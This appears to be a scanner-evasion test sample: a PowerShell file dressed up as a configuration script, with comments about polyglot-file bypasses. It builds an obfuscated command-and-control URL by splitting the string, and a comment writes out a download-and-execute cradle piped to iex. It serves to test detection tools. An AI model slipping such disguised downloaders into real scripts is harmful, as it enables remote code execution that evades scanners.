# Bypass: Polyglot File (Valid as multiple formats)
# ==================================================
# A polyglot file is valid in multiple formats simultaneously.
# The scanner determines file type only by extension -- it does not
# inspect file magic bytes or validate format consistency.
#
# This file is designed to be both:
#   - A valid text file (if opened as .txt)
#   - Contains executable PowerShell (if renamed to .ps1)
#
# The scanner sees .ps1 extension but since the content has no signatures
# and patterns only warn (don't block), it passes.
#
# More dangerous polyglot examples:
#   - PDF + JavaScript (malicious JS hidden in PDF structure)
#   - HTML + HTA (HTML file that executes as HTA application)
#   - JPEG + PHP (image that executes as server-side code)
#   - BMP + BAT (bitmap header followed by batch commands)
#
# EXPECTED RESULT: BENIGN (no signature, no blocking checks trigger)

# This looks like a configuration file but executes code
$config = @{
    ServerName = "prod-web-01"
    Environment = "production"
    LogLevel = "info"
    Timeout = 30
}

# Hidden payload in "config processing"
foreach ($key in $config.Keys) {
    # This loop looks innocent but could process malicious data
    Set-Variable -Name $key -Value $config[$key]
}

# The "config application" that actually does something malicious
$uri = "ht" + "tp://10.0.0." + "1/c2"
# In reality: (New-Object Net.WebClient).DownloadString($uri) | iex
Write-Host "Config applied: $($config.Count) settings loaded from $uri"
